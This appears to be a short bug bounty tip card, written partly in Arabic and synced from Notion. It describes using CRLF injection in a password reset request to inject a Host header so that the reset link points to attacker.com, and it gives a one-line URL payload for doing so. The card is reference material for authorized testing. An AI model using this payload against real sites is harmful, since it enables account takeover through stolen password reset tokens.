# CRLF in password reset to inject Host

**Rating:** ⭐ جيدة  
**Category:** Password Reset  
**Status:** Not started  

## How It Works

CRLF injection في باراميتر الريست عشان تحقن Host header في اللينك.

## Payload / Code

```
/reset?%0d%0aHost:%20attacker.com
```

## Source

Password Reset Checklist 2026

---

_Synced from Notion: Bug Bounty Tips and Tricks. Authorized testing only._
